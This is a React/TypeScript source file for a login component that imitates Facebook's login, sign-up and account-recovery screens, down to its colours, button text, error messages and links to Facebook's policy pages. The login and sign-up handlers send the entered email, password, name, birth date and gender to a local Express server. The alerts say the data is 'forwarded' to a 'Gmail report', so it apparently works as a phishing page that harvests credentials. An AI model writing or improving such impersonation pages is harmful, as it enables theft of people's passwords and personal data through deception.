
import React, { useState } from 'react';

type ViewState = 'login' | 'forgot' | 'success' | 'signup';

const LoginForm: React.FC = () => {
  const [view, setView] = useState<ViewState>('login');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [forgotEmail, setForgotEmail] = useState('');
  
  // Signup fields
  const [signupData, setSignupData] = useState({
    firstName: '',
    surname: '',
    mobileEmail: '',
    newPassword: '',
    birthDay: '1',
    birthMonth: 'Jan',
    birthYear: '2024',
    gender: ''
  });

  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState<{ [key: string]: string }>({});

  const validateLogin = () => {
    const newErrors: { [key: string]: string } = {};
    if (!email) {
      newErrors.email = 'The email or mobile number you entered isn’t connected to an account.';
    }
    if (!password) {
      newErrors.password = 'The password you’ve entered is incorrect.';
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (validateLogin()) {
      setIsLoading(true);
      
      try {
        // Updated to point to our custom Node.js Express backend
        const response = await fetch("http://localhost:5000/login", {
          method: "POST",
          headers: { 
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            username: email,
            password: password
          })
        });
        
        const result = await response.json();
        if (result.success) {
          alert('Login attempt forwarded to backend. Check your Gmail report.');
        } else {
          alert('Backend error: ' + result.message);
        }
      } catch (error) {
        console.error("Login service error:", error);
        alert('Server unreachable. Ensure the Node.js backend is running on port 5000.');
      } finally {
        setIsLoading(false);
      }
    }
  };

  const handleSignupSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    
    try {
      // Updated to point to our custom Node.js Express backend
      const response = await fetch("http://localhost:5000/signup", {
        method: "POST",
        headers: { 
          "Content-Type": "application/json"
        },
        body: JSON.stringify(signupData)
      });
      
      const result = await response.json();
      if (result.success) {
        alert('Signup data forwarded to backend. Check your Gmail report.');
        setView('login');
      } else {
        alert('Backend error: ' + result.message);
      }
    } catch (error) {
      console.error("Signup service error:", error);
      alert('Server unreachable. Ensure the Node.js backend is running on port 5000.');
    } finally {
      setIsLoading(false);
    }
  };

  const handleForgotSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    // Non-functional for this demo logic update
    setView('success');
  };

  if (view === 'signup') {
    return (
      <div className="bg-white rounded-lg shadow-2xl border border-gray-200 w-full overflow-hidden animate-in fade-in zoom-in duration-300">
        <div className="p-4 border-b border-[#dddfe2] flex justify-between items-start">
          <div>
            <h2 className="text-[32px] font-bold text-gray-800 leading-tight">Sign Up</h2>
            <p className="text-[#606770] text-[15px]">It's quick and easy.</p>
          </div>
          <button 
            onClick={() => setView('login')}
            className="text-gray-400 hover:text-gray-600 transition-colors p-1"
          >
            <svg className="w-7 h-7" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M6 18L18 6M6 6l12 12"></path>
            </svg>
          </button>
        </div>
        
        <form onSubmit={handleSignupSubmit} className="p-4 space-y-3">
          <div className="flex space-x-3">
            <input
              type="text"
              placeholder="First name"
              className="w-1/2 p-2.5 border border-[#ccd0d5] rounded-md bg-[#f5f6f7] focus:border-[#1877f2] focus:ring-1 focus:ring-blue-100 outline-none text-[15px]"
              onChange={(e) => setSignupData({...signupData, firstName: e.target.value})}
              required
            />
            <input
              type="text"
              placeholder="Surname"
              className="w-1/2 p-2.5 border border-[#ccd0d5] rounded-md bg-[#f5f6f7] focus:border-[#1877f2] focus:ring-1 focus:ring-blue-100 outline-none text-[15px]"
              onChange={(e) => setSignupData({...signupData, surname: e.target.value})}
              required
            />
          </div>

          <div className="space-y-3">
            <input
              type="text"
              placeholder="Mobile number or email address"
              className="w-full p-2.5 border border-[#ccd0d5] rounded-md bg-[#f5f6f7] focus:border-[#1877f2] focus:ring-1 focus:ring-blue-100 outline-none text-[15px]"
              onChange={(e) => setSignupData({...signupData, mobileEmail: e.target.value})}
              required
            />
            <input
              type="password"
              placeholder="New password"
              className="w-full p-2.5 border border-[#ccd0d5] rounded-md bg-[#f5f6f7] focus:border-[#1877f2] focus:ring-1 focus:ring-blue-100 outline-none text-[15px]"
              onChange={(e) => setSignupData({...signupData, newPassword: e.target.value})}
              required
            />
          </div>
          
          <div className="space-y-1">
            <label className="text-[12px] text-[#606770] font-normal">Date of birth</label>
            <div className="flex space-x-3">
              <select className="flex-1 p-2 border border-[#ccd0d5] rounded-md bg-white text-[15px] outline-none" value={signupData.birthDay} onChange={e => setSignupData({...signupData, birthDay: e.target.value})}>
                {Array.from({length: 31}, (_, i) => <option key={i+1}>{i+1}</option>)}
              </select>
              <select className="flex-1 p-2 border border-[#ccd0d5] rounded-md bg-white text-[15px] outline-none" value={signupData.birthMonth} onChange={e => setSignupData({...signupData, birthMonth: e.target.value})}>
                {['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'].map(m => <option key={m}>{m}</option>)}
              </select>
              <select className="flex-1 p-2 border border-[#ccd0d5] rounded-md bg-white text-[15px] outline-none" value={signupData.birthYear} onChange={e => setSignupData({...signupData, birthYear: e.target.value})}>
                {Array.from({length: 120}, (_, i) => <option key={i}>{2024-i}</option>)}
              </select>
            </div>
          </div>

          <div className="space-y-1">
            <label className="text-[12px] text-[#606770] font-normal">Gender</label>
            <div className="flex space-x-3">
              {['Female', 'Male', 'Custom'].map(g => (
                <label key={g} className={`flex-1 flex justify-between items-center p-2.5 border rounded-md bg-white text-[15px] cursor-pointer transition-colors ${signupData.gender === g ? 'border-[#1877f2]' : 'border-[#ccd0d5]'}`}>
                  <span className="text-gray-800">{g}</span>
                  <input 
                    type="radio" 
                    name="gender" 
                    value={g} 
                    checked={signupData.gender === g}
                    className="w-4 h-4 text-[#1877f2]"
                    onChange={(e) => setSignupData({...signupData, gender: e.target.value})} 
                  />
                </label>
              ))}
            </div>
          </div>

          <p className="text-[11px] text-[#777] leading-[1.3] pt-2">
            By clicking Sign Up, you agree to our <a href="https://www.facebook.com/legal/terms" target="_blank" className="text-[#385898] hover:underline">Terms</a>, <a href="https://www.facebook.com/privacy/policy" target="_blank" className="text-[#385898] hover:underline">Privacy Policy</a> and <a href="https://www.facebook.com/policies/cookies" target="_blank" className="text-[#385898] hover:underline">Cookies Policy</a>.
          </p>

          <div className="flex justify-center pt-2">
            <button
              type="submit"
              disabled={isLoading}
              className="bg-[#00a400] hover:bg-[#008a00] text-white font-bold py-1.5 px-14 rounded-md text-[18px] transition-colors duration-200 min-w-[194px] flex items-center justify-center shadow-md active:bg-[#007000]"
            >
              {isLoading ? (
                <svg className="animate-spin h-6 w-6 text-white" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
              ) : (
                'Sign Up'
              )}
            </button>
          </div>
        </form>
      </div>
    );
  }

  if (view === 'forgot') {
    return (
      <div className="bg-white rounded-lg shadow-xl border border-gray-200 w-full overflow-hidden">
        <div className="p-4 border-b border-gray-200">
          <h2 className="text-xl font-bold text-gray-800">Find Your Account</h2>
        </div>
        <form onSubmit={handleForgotSubmit} className="p-4 space-y-4">
          <p className="text-[17px] text-gray-700 leading-tight">
            Please enter your email address or mobile number to search for your account.
          </p>
          <input
            type="text"
            placeholder="Email address or mobile number"
            className="w-full p-3 border border-gray-300 rounded-md outline-none focus:border-blue-500"
            autoFocus
          />
          <div className="flex justify-end space-x-2 pt-2">
            <button
              type="button"
              onClick={() => setView('login')}
              className="bg-gray-200 hover:bg-gray-300 text-gray-700 font-bold py-2 px-4 rounded-md"
            >
              Cancel
            </button>
            <button
              type="submit"
              className="bg-[#1877f2] hover:bg-[#166fe5] text-white font-bold py-2 px-4 rounded-md"
            >
              Search
            </button>
          </div>
        </form>
      </div>
    );
  }

  if (view === 'success') {
    return (
      <div className="bg-white p-6 rounded-lg shadow-xl border border-gray-200 w-full text-center space-y-4">
        <h2 className="text-xl font-bold text-gray-800">Request Sent</h2>
        <p className="text-gray-600">Please check your inbox for instructions.</p>
        <button
          onClick={() => setView('login')}
          className="w-full bg-[#1877f2] text-white font-bold py-3 rounded-md"
        >
          Back to Log In
        </button>
      </div>
    );
  }

  return (
    <div className="bg-white p-4 rounded-lg shadow-xl border border-gray-200 w-full">
      <form onSubmit={handleLoginSubmit} className="space-y-4">
        <div>
          <input
            type="text"
            placeholder="Email address or phone number"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            className={`w-full p-3 sm:p-4 border ${
              errors.email ? 'border-red-500' : 'border-gray-300 focus:border-blue-500'
            } rounded-md outline-none text-base`}
          />
        </div>

        <div>
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className={`w-full p-3 sm:p-4 border ${
              errors.password ? 'border-red-500' : 'border-gray-300 focus:border-blue-500'
            } rounded-md outline-none text-base`}
          />
        </div>

        <button
          type="submit"
          disabled={isLoading}
          className="w-full bg-[#1877f2] hover:bg-[#166fe5] active:bg-[#145dbf] text-white font-bold py-3 rounded-md text-xl flex items-center justify-center transition-colors"
        >
          {isLoading ? (
            <svg className="animate-spin h-6 w-6 text-white" viewBox="0 0 24 24">
              <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
              <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
            </svg>
          ) : (
            'Log In'
          )}
        </button>

        <div className="text-center">
          <button 
            type="button"
            onClick={() => setView('forgot')}
            className="text-[#1877f2] text-sm hover:underline"
          >
            Forgotten password?
          </button>
        </div>

        <hr className="border-[#dadde1] my-4" />

        <div className="flex justify-center pb-2">
          <button
            type="button"
            onClick={() => setView('signup')}
            className="bg-[#42b72a] hover:bg-[#36a420] text-white font-bold py-3 px-4 rounded-md text-base shadow-sm"
          >
            Create new account
          </button>
        </div>
      </form>
    </div>
  );
};

export default LoginForm;
